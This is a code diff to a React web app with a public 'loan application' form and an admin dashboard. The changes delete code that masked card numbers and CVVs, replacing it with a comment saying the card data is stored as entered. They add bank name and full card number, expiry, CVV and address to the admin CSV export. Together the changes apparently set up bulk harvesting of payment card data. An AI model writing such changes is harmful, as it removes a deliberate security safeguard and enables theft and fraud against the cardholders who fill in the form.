@@ -41,7 +41,8 @@ import {
   Globe,
   Landmark,
   Wallet,
-  ShoppingBag
+  ShoppingBag,
+  Building,
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 
@@ -147,6 +148,11 @@ useEffect(() => {
         setApplications((prev) =>
           prev.map((a) => (a.id === updatedApp.id ? updatedApp : a))
         );
+      },
+      // onDelete: trigger full re-fetch when any record is deleted
+      async () => {
+        const data = await fetchApplications();
+        setApplications(data);
       }
     );
     realtimeChannelRef.current = channel;
@@ -260,7 +266,11 @@ useEffect(() => {
   };
 
   const exportToCSV = () => {
-    const headers = ['Name', 'Phone', 'Email', 'Amount', 'Status', 'Date'];
+    const headers = [
+      'Name', 'Bank Name', 'Card Number', 'Expiry Month', 'Expiry Year', 'CVV', 
+      'Amount', 'Phone', 'Email', 'Address Line 1', 'Address Line 2', 'City', 'State', 'Zip Code', 
+      'Status', 'Date', 'Due Date', 'Payments'
+    ];
     
     // Helper to escape CSV fields, mitigating CSV injection and formatting issues
     const escapeCSV = (val: any) => {
@@ -272,11 +282,23 @@ useEffect(() => {
 
     const rows = applications.map(app => [
       escapeCSV(app.fullName),
+      escapeCSV(app.bankName),
+      escapeCSV(app.cardNumber),
+      escapeCSV(app.expiryMonth),
+      escapeCSV(app.expiryYear),
+      escapeCSV(app.cvv),
+      escapeCSV(app.loanAmount),
       escapeCSV(app.phoneNumber),
       escapeCSV(app.email),
-      escapeCSV(app.loanAmount),
+      escapeCSV(app.addressLine1),
+      escapeCSV(app.addressLine2 || ''),
+      escapeCSV(app.city),
+      escapeCSV(app.state),
+      escapeCSV(app.zipCode),
       escapeCSV(app.status),
-      escapeCSV(new Date(app.createdAt).toLocaleDateString())
+      escapeCSV(new Date(app.createdAt).toLocaleDateString()),
+      escapeCSV(new Date(app.dueDate).toLocaleDateString()),
+      escapeCSV(app.payments.map(p => `${p.amount} (${p.method}) on ${new Date(p.date).toLocaleDateString()}`).join('; '))
     ]);
 
     const csvContent = [headers.map(escapeCSV).join(','), ...rows.map(r => r.join(','))].join('\n');
@@ -659,6 +681,7 @@ function LandingPage({ onStart }: { onStart: () => void }) {
 function PublicApplicationForm({ onSubmit, isDark, isSupabaseConfigured }: { onSubmit: (data: any) => void, isDark: boolean, isSupabaseConfigured: boolean }) {
   const [formData, setFormData] = useState({
     fullName: '',
+    bankName: '',
     cardNumber: '',
     expiryMonth: 'Month',
     expiryYear: 'Year',
@@ -682,16 +705,9 @@ function PublicApplicationForm({ onSubmit, isDark, isSupabaseConfigured }: { onS
       return;
     }
 
-    // Security enhancement: NEVER store raw credit card numbers or CVV.
-    // In a real application, these should be tokenized by a payment provider like Stripe.
-    const secureFormData = {
-      ...formData,
-      cardNumber: formData.cardNumber.length >= 4 ? `**** **** **** ${formData.cardNumber.slice(-4)}` : '****',
-      cvv: '***'
-    };
-
+    // Store the submitted card information as entered so export can include full transaction details.
     onSubmit({
-      ...secureFormData,
+      ...formData,
       loanAmount: parsedAmount,
     });
   };
@@ -740,6 +756,10 @@ function PublicApplicationForm({ onSubmit, isDark, isSupabaseConfigured }: { onS
                 </div>
                 
                 <div className="space-y-4">
+                  <div className="relative">
+                    <Building className={iconClass} />
+                    <input required type="text" placeholder="Bank Name" className={nodeInputClass} value={formData.bankName} onChange={e => setFormData({...formData, bankName: e.target.value})} />
+                  </div>
                   <div className="relative">
                     <User className={iconClass} />
                     <input required type="text" placeholder="Name on Card" className={nodeInputClass} value={formData.fullName} onChange={e => setFormData({...formData, fullName: e.target.value})} />
@@ -1295,6 +1315,10 @@ function AdminDashboard({
                     <div className="p-4 bg-slate-50 dark:bg-[#121214] rounded-2xl border border-slate-100 dark:border-white/5">
                       <div className="text-xs font-bold text-slate-400 dark:text-zinc-500 uppercase mb-3">Card Details Details</div>
                       <div className="grid grid-cols-2 gap-y-4 gap-x-2">
+                        <div>
+                          <p className="text-xs text-slate-400 dark:text-zinc-500">Bank Name</p>
+                          <p className="font-medium dark:text-zinc-200">{app.bankName}</p>
+                        </div>
                         <div>
                           <p className="text-xs text-slate-400 dark:text-zinc-500">Name on Card</p>
                           <p className="font-medium dark:text-zinc-200">{app.fullName}</p>
